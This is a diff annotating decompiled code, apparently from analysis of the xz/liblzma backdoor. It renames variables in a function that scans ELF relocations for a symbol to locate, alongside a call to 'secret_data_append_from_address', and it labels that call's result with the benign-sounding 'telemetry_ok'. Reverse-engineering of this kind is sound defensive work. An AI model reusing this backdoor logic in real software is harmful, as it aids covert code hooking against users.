@@ -17,18 +17,18 @@ void * elf_get_reloc_symbol
                  EncodedStringId encoded_string_id)
 
 {
-  BOOL BVar1;
-  EncodedStringId EVar2;
-  ulong uVar3;
+  BOOL telemetry_ok;
+  EncodedStringId sym_name_id;
+  ulong reloc_index;
   
-  BVar1 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x67,5,4);
-  uVar3 = 0;
-  if (BVar1 != FALSE) {
-    for (; uVar3 < num_relocs; uVar3 = uVar3 + 1) {
+  telemetry_ok = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x67,5,4);
+  reloc_index = 0;
+  if (telemetry_ok != FALSE) {
+    for (; reloc_index < num_relocs; reloc_index = reloc_index + 1) {
       if ((((relocs->r_info & 0xffffffff) == reloc_type) &&
           (elf_info->symtab[relocs->r_info >> 0x20].st_shndx == 0)) &&
-         (EVar2 = get_string_id(elf_info->strtab + elf_info->symtab[relocs->r_info >> 0x20].st_name,
-                                (char *)0x0), EVar2 == encoded_string_id)) {
+         (sym_name_id = get_string_id(elf_info->strtab + elf_info->symtab[relocs->r_info >> 0x20].st_name,
+                                (char *)0x0), sym_name_id == encoded_string_id)) {
         return elf_info->elfbase->e_ident + relocs->r_offset;
       }
       relocs = relocs + 1;
